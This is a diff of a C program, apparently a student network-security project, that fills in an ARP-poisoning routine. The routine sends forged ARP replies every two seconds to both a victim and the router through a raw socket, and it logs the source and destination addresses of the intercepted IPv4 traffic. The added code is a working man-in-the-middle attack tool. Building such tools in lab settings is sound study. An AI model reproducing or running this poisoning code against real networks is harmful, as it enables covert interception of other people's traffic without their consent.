@@ -4,11 +4,13 @@
 # include <stdio.h>
 # include <stdlib.h>
 # include <unistd.h>
+# include <time.h>
 
 #include <net/if.h>
 #include <linux/if_ether.h>
 #include <linux/if_packet.h>
 #include <signal.h>
+#include <netinet/ip.h>
 
 //---------------------
 #include <sys/socket.h>
@@ -97,38 +99,40 @@ static struct in_addr get_access_point_ip(t_session session)
 	return (target_ip);
 }
 
-static void send_arp_request(int socket, int index, t_session session, struct in_addr target_ip)
+static void send_packet(int sock, int index, struct arp_packet *pkt, unsigned char *dest_mac) 
 {
-	struct arp_packet pkt;
-	struct sockaddr_ll sll;	
+	struct sockaddr_ll sll;
 
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;      
+	sll.sll_ifindex = index;     
+	sll.sll_halen = ETH_ALEN; 
+
+	memcpy(sll.sll_addr, dest_mac, ETH_ALEN);
+
+	if (sendto(sock, pkt, sizeof(struct arp_packet), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) 
+		error("Failed to send");
+}
+
+static void fill_arp_request(t_session session, struct arp_packet *pkt, int protocol)
+{
 	//Ethernet header	
-	memset(pkt.eth.h_dest, 0xff, 6);          		// Destino: Broadcast (ff:ff:ff:ff:ff:ff)
-    memcpy(pkt.eth.h_source, session.src.mac, 6);   // Origen: Tu MAC
-    pkt.eth.h_proto = htons(ETH_P_ARP);			// Tipo: ARP (0x0806)
-	
-    //Body ARP
-    pkt.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // Hardware: Ethernet (1)
-    pkt.arp.ea_hdr.ar_pro = htons(ETH_P_IP);    // Protocolo: IPv4 (0x0800)
-    pkt.arp.ea_hdr.ar_hln = 6;                  // Tamaño MAC: 6
-    pkt.arp.ea_hdr.ar_pln = 4;                  // Tamaño IP: 4
-    pkt.arp.ea_hdr.ar_op = htons(ARPOP_REQUEST); // Operación: REQUEST (1)
+	memset(pkt->eth.h_dest, 0xff, 6);          		// Destino: Broadcast (ff:ff:ff:ff:ff:ff)
+	memcpy(pkt->eth.h_source, session.src.mac, 6);   // Origen: Tu MAC
+	pkt->eth.h_proto = htons(ETH_P_ARP);			// Tipo: ARP (0x0806)
 
-    //Directions inside body ARP
-    memcpy(pkt.arp.arp_sha, session.src.mac, 6);           // Sender MAC
-    memcpy(pkt.arp.arp_spa, &session.src.ip.s_addr, 4);    // Sender IP
-    memset(pkt.arp.arp_tha, 0x00, 6);  	                 // Target MAC (desconocida)
-	memcpy(pkt.arp.arp_tpa, &target_ip, 4);  				// Target IP (el .1)
+	//Body ARP
+	pkt->arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // Hardware: Ethernet (1)
+	pkt->arp.ea_hdr.ar_pro = htons(ETH_P_IP);    // Protocolo: IPv4 (0x0800)
+	pkt->arp.ea_hdr.ar_hln = 6;                  // Tamaño MAC: 6
+	pkt->arp.ea_hdr.ar_pln = 4;                  // Tamaño IP: 4
+	pkt->arp.ea_hdr.ar_op = htons(protocol); // Operación: REQUEST | REPLY
 
-    //Prepare sendto ---
-    memset(&sll, 0, sizeof(sll));
-    sll.sll_family = AF_PACKET;
-    sll.sll_ifindex = index;
-    sll.sll_halen = 6;
-    memcpy(sll.sll_addr, pkt.eth.h_dest, 6);
-
-    if (sendto(socket, &pkt, sizeof(pkt), 0, (struct sockaddr*)&sll, sizeof(sll)) < 0) 
-       error("Failed to send");
+	//Directions inside body ARP
+	memcpy(pkt->arp.arp_sha, session.src.mac, 6);           // Sender MAC
+	memcpy(pkt->arp.arp_spa, &session.src.ip.s_addr, 4);    // Sender IP
+	memcpy(pkt->arp.arp_tha, session.dst.mac, 6);  	       // Target MAC 
+	memcpy(pkt->arp.arp_tpa, &session.dst.ip.s_addr, 4);    // Target IP 
 }
 
 static unsigned char *receive_arp_response(int socket)
@@ -150,99 +154,73 @@ static unsigned char *receive_arp_response(int socket)
 	return (0);
 }
 
-static void get_access_point_mac(t_session session, t_pair *access_point)
+static void get_access_point_mac(int socket, unsigned int *index, t_session session, t_pair *access_point)
 {
-	unsigned int index;
 	unsigned char *temp_mac;
-	int socket;
 	struct ifaddrs *ifaddr;
+	struct arp_packet pkt;
+	t_session first;
 
 	if (getifaddrs(&ifaddr) == -1)\
 		error("cannot access mac address of the system");
 
+	first = session;
 	char *name = get_nic(ifaddr);
-	index = if_nametoindex(name);           
-	socket = raw_socket();
+	*index = if_nametoindex(name);           
 	access_point->ip = get_access_point_ip(session); 
-	send_arp_request(socket, index, session, access_point->ip);
+	first.dst.ip = access_point->ip;
+	memset(first.dst.mac, 0, 6);
+	fill_arp_request(first, &pkt, ARPOP_REQUEST);
+	send_packet(socket, *index, &pkt, pkt.eth.h_dest);
 	temp_mac = receive_arp_response(socket);
 	if (temp_mac)
     	memcpy(access_point->mac, temp_mac, 6);
 	else 
 		error("Cannot get access point MAC");
-
-	//DEBUG
-	//----------------------------------------------------------------
-	printf("NAME: %s\n", name); 
-	printf("INDEX: %u\n", index); 
-
-	//----------------------------------------------------------------
-	// example
-	//----------------------------------------------------------------
-	int family, s;
-	char host[NI_MAXHOST];
-
-	for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) 
-	{
-		if (ifa->ifa_addr == NULL)
-			continue;
-
-		family = ifa->ifa_addr->sa_family;
-
-		/* Display interface name and family (including symbolic
-				  form of the latter for the common families).  */
-
-		printf("ifa name: %-8s %s (%d)\n", ifa->ifa_name,
-		 (family == AF_PACKET) ? "AF_PACKET" :
-		 (family == AF_INET) ? "AF_INET" :
-		 (family == AF_INET6) ? "AF_INET6" : "???",
-		 family);
-
-		/* For an AF_INET* interface address, display the address.  */
-
-		if (family == AF_INET || family == AF_INET6) {
-			s = getnameinfo(ifa->ifa_addr,
-				   (family == AF_INET) ? sizeof(struct sockaddr_in) :
-				   sizeof(struct sockaddr_in6),
-				   host, NI_MAXHOST,
-				   NULL, 0, NI_NUMERICHOST);
-			if (s != 0) {
-				printf("getnameinfo() failed: %s\n", gai_strerror(s));
-				exit(EXIT_FAILURE);
-			}
-
-
-			printf("\t\taddress: <%s>\n", host);
-
-		} else if (family == AF_PACKET && ifa->ifa_data != NULL) {
-			struct sockaddr_ll *s = (struct sockaddr_ll *)ifa->ifa_addr;
-
-			printf("%-10s ", ifa->ifa_name);
-			for (int i = 0; i < s->sll_halen; i++) {
-				printf("%02x%c", s->sll_addr[i], (i + 1 < s->sll_halen) ? ':' : '\n');
-			}
-			struct rtnl_link_stats *stats = ifa->ifa_data;
-
-			printf("\t\ttx_packets = %10u; rx_packets = %10u\n"
-		  "\t\ttx_bytes   = %10u; rx_bytes   = %10u\n",
-		  stats->tx_packets, stats->rx_packets,
-		  stats->tx_bytes, stats->rx_bytes);
-		}
-	}
 	freeifaddrs(ifaddr);
 }
 
-//spoofing() una funcion que haga la request y le haga creer a una ip que tiene x o y direccion mac
-
-static void poising(t_session session, t_pair router)
+static void poisoning(int sock, int index, t_session victim_session, t_pair access_point)
 {
+	struct arp_packet router_packet;
+	struct arp_packet victim_packet;
+	t_session router_session;
+	time_t last_poison = 0;
+	unsigned char buffer[2048];
+
+	router_session = victim_session;
+	router_session.dst.ip = access_point.ip;
+	memcpy(router_session.dst.mac, access_point.mac, 6);
+
 	while(loop)
 	{
-		printf("aqui se hace la magia pero me da mucha paja hacerlo ahora son las 3am voy a dormir\n");	
-		sleep(2);
+		time_t now = time(NULL);
+		if (now - last_poison >= 2)
+		{
+			//POISON ROUTER
+			fill_arp_request(router_session, &router_packet, ARPOP_REPLY);
+			send_packet(sock, index, &router_packet, router_session.dst.mac);
+			//POISON VICTIM
+			fill_arp_request(victim_session, &victim_packet, ARPOP_REPLY);
+			send_packet(sock, index, &victim_packet, victim_session.dst.mac);
+			last_poison = now;
+		}
+
+		ssize_t bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
+
+		if (bytes > 0)
+		{
+			struct ethhdr *eth = (struct ethhdr *)buffer;
+
+			if (ntohs(eth->h_proto) == ETH_P_IP)
+			{
+				struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
+
+				printf("CAPTURA: %s -> ", inet_ntoa(*(struct in_addr *)&ip->saddr));
+				printf("%s [%ld bytes]\n", inet_ntoa(*(struct in_addr *)&ip->daddr), bytes);
+			}
+		}
 	}
-	(void)session;
-	(void)router;
 }
 
 //signal handler
@@ -254,15 +232,18 @@ static void loop_handler(int sig)
 
 int main (int ac, char *av[])
 {
+	int socket;
+	unsigned int index;
 	t_session session;
 	t_pair access_point;
-	unsigned char acces_point_mac(); 
+
 	if (ac != 5)	
 		usage();
 	parse_input(av, &session);
-	get_access_point_mac(session, &access_point);
+	socket = raw_socket();
+	get_access_point_mac(socket, &index, session, &access_point);
 	signal(SIGINT, loop_handler);
-	poising(session, access_point);
+	poisoning(socket, index, session, access_point);
 
 	printf("[DEBUG] MAC Recibida: %02x:%02x:%02x:%02x:%02x:%02x\n",
 		access_point.mac[0], access_point.mac[1], access_point.mac[2], access_point.mac[3], access_point.mac[4], access_point.mac[5]);
